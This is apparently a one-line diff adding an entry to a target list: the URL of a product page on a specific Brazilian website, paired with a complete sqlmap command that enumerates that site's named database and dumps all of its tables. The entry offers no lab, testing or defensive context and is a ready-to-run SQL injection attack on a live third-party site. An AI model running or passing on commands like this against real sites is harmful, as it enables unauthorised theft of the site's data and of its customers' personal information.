@@ -1,0 +1,1 @@
+http://www.zorh.com.br/produto.php?id=1 (GET)  # sqlmap.py -u http://www.zorh.com.br/produto.php?id=1 -D zorh_com_br --tables --dump-all --threads 5 -v3
